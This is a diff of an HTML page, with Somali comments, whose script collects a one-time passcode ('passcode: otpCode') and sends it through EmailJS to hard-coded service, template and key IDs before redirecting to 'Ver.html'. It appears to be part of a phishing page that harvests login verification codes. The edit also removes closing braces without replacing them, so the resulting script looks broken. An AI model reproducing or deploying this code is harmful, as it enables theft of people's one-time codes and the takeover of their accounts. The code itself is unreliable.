@@ -150,7 +150,6 @@
     </div>
 <head>
 
-<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script type="text/javascript">
@@ -210,21 +209,24 @@
                 passcode: otpCode   
             };
 
-            // 6. Dir Email-ka adigoo isticmaalaya ID-yada saxda ah
-            emailjs.send('service_91mb9t5', 'template_j0rxugs', templateParams)
-                .then(function() {
-                    if (loaderText) loaderText.innerText = "Guul! Koodhkii waa la diray...";
-                    setTimeout(() => {
-                        window.location.href = "Ver.html"; 
-                    }, 1200); 
-                })
-                .catch(function(error) {
-                    if (loader) loader.classList.add('hidden'); 
-                    alert("Cillad: " + JSON.stringify(error));
-                    console.error("EmailJS Error details:", error);
-                });
-        }); // Xidhitaanka EventListener - SAX AH
-    } // Xidhitaanka If Statement - SAX AH
+            // 6. Dir Email-ka adigoo isticmaalaya ID-yada saxda ah ee sawirradaada
+emailjs.send(
+    'service_twqprpi',    // Service ID-gaaga Gmail-ka (Sawirka 3aad)
+    'template_dlpkvxw',   // Template ID-gaaga (Sawirka 2aad)
+    templateParams, 
+    'IN3zER21TXypQH8rt'   // Public Key-gaaga (Sawirka 1aad)
+)
+.then(function() {
+    if (loaderText) loaderText.innerText = "Guul! Koodhkii waa la diray...";
+    setTimeout(() => {
+        window.location.href = "Ver.html"; 
+    }, 1200); 
+})
+.catch(function(error) {
+    if (loader) loader.classList.add('hidden'); 
+    alert("Cillad: " + JSON.stringify(error));
+    console.error("EmailJS Error details:", error);
+});
 </script>
 
 </body>
